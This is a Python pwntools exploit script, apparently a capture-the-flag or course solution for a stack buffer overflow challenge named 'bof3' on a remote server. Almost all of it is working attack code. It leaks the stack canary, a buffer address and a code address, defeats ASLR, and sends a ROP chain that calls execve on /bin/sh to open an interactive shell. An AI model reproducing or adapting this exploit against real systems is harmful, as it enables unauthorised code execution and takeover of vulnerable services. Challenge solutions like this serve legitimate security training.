#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 10261


chal_rop = ROP(exe)

mov_addr = 0x3a8e3
rdi_addr = chal_rop.find_gadget(["pop rdi", "ret"]).address
rsi_addr = chal_rop.find_gadget(["pop rsi", "ret"]).address
rdx_addr = chal_rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
rax_addr = chal_rop.find_gadget(["pop rax", "ret"]).address
syscall_addr = chal_rop.find_gadget(["syscall", "ret"]).address

# print(mov_addr)
# print(hex(rdi_addr))
# print(hex(rsi_addr))
# print(hex(rdx_addr))
# print(hex(rax_addr))
# print(hex(syscall_addr))

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
else:
    r = remote('up.zoolab.org', port)

payload = flat(asm('nop') * 40)
r.sendafter(b"name? ", payload)
r.recvuntil(b"Welcome, "+flat(asm('nop') * 40))
canary = r.recvline()[:-1]
if canary == b'':
    canary = b'\x00'
else:
    canary = canary[0]

payload = flat(asm('nop') * 41)
r.sendafter(b"oom number? ", payload)
r.recvuntil(b"The room number is: "+flat(asm('nop') * 41))
res = r.recvline()
canary = canary+res[:7]
buf_addr = u64(res[7:-1].ljust(8, b'\x00'))-0x40
# print(hex(u64(canary)))
# print(hex(buf_addr))

payload = flat(asm('nop') * 56)
r.sendafter(b"s name? ", payload)
r.recvuntil(b"The customer's name is: "+flat(asm('nop') * 56))
main_108 = u64(r.recvline()[:-1].ljust(8, b'\x00'))

# 0x8ad0-0x8a64 = 0x6C
main = main_108 - 0x6C
base_addr = main - 0x8a64
# print(hex(base_addr))

ropc = flat([base_addr+rdi_addr, p64(buf_addr), base_addr+rsi_addr, 0, base_addr+rdx_addr, 0, 0, base_addr+rax_addr, 0x3b, base_addr+syscall_addr])
# print(ropc)
r.sendafter(b"Leave your message: ", b"/bin/sh".ljust(40, b'\x00')+canary+asm('nop')*8+ropc)

r.interactive()

